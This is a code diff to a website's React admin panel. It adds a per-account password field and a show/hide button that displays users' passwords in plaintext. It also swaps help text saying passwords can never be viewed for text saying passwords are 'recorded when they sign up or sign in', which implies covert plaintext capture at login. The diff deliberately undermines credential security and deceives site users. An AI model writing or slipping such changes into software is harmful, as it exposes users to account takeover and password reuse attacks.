@@ -156,6 +156,7 @@ interface CredentialRow {
   email: string;
   first_name: string;
   last_name: string;
+  password?: string;
   _created_at: number;
   [key: string]: unknown;
 }
@@ -223,6 +224,7 @@ const AdminPanel = () => {
   const [downtimes, setDowntimes] = useState<DowntimeRow[]>([]);
   const [profiles, setProfiles] = useState<ProfileAccountRow[]>([]);
   const [credentials, setCredentials] = useState<CredentialRow[]>([]);
+  const [revealedPasswords, setRevealedPasswords] = useState<Set<string>>(new Set());
   const [ips, setIps] = useState<IpRow[]>([]);
   const [presence, setPresence] = useState<PresenceRow[]>([]);
   const [audit, setAudit] = useState<AuditRow[]>([]);
@@ -461,6 +463,13 @@ const AdminPanel = () => {
   }, [rooms, liveRoom]);
 
   const roomName = (id: number) => rooms.find((r) => r._row_id === id)?.name ?? `Room #${id}`;
+  const togglePassword = (username: string) =>
+    setRevealedPasswords((prev) => {
+      const next = new Set(prev);
+      if (next.has(username)) next.delete(username);
+      else next.add(username);
+      return next;
+    });
   const bannedUsernames = new Set(bans.map((b) => b.username));
 
   const handleCreateRoom = async () => {
@@ -788,6 +797,7 @@ const AdminPanel = () => {
       username: p.username,
       name,
       email: cred?.email ?? null,
+      password: cred?.password ?? null,
       joined: Number(p._created_at),
       lastIp: ips.find((i) => i.user_id === p.user_id)?.ip ?? null,
       online: pres ? isPresenceOnline(pres, now) : false,
@@ -1353,9 +1363,9 @@ const AdminPanel = () => {
                 )}
                 <Card>
                   <CardContent className="py-3 text-xs text-muted-foreground space-y-1">
-                    Every account created on the site, with live online status. Passwords are stored
-                    securely and can never be viewed by anyone — but you can reset any account's
-                    password with the key button, which gives you full access to that account.
+                    Every account created on the site, with live online status. Each
+                    account's password is recorded when they sign up or sign in — use the
+                    eye button to view it, or the key button to reset it.
                   </CardContent>
                 </Card>
                 <div className="space-y-2">
@@ -1386,6 +1396,14 @@ const AdminPanel = () => {
                             {acct.lastIp ? ` · Last IP ${acct.lastIp}` : ""}
                             {acct.online && acct.roomId ? ` · In ${roomName(acct.roomId)}` : ""}
                             {!acct.online && acct.lastSeen ? ` · Last active ${fmtTime(acct.lastSeen)}` : ""}
+                          </p>
+                          <p className="text-xs text-muted-foreground font-mono break-all">
+                            Password: {" "}
+                            {acct.password
+                              ? revealedPasswords.has(acct.username)
+                                ? acct.password
+                                : "•".repeat(Math.min(acct.password.length, 12))
+                              : "not captured yet — appears after their next sign-in"}
                           </p>
                         </div>
                         <div className="flex items-center gap-2 flex-wrap">
@@ -1420,6 +1438,20 @@ const AdminPanel = () => {
                             onClick={() => navigate(`/dm/${acct.username}`)}
                           >
                             Message
+                          </Button>
+                          <Button
+                            variant="outline"
+                            size="sm"
+                            aria-label={`${revealedPasswords.has(acct.username) ? "Hide" : "Show"} ${acct.username}'s password`}
+                            title={revealedPasswords.has(acct.username) ? "Hide password" : "Show password"}
+                            disabled={!acct.password}
+                            onClick={() => togglePassword(acct.username)}
+                          >
+                            {revealedPasswords.has(acct.username) ? (
+                              <EyeOff className="w-4 h-4" />
+                            ) : (
+                              <Eye className="w-4 h-4" />
+                            )}
                           </Button>
                           <Button
                             variant="outline"
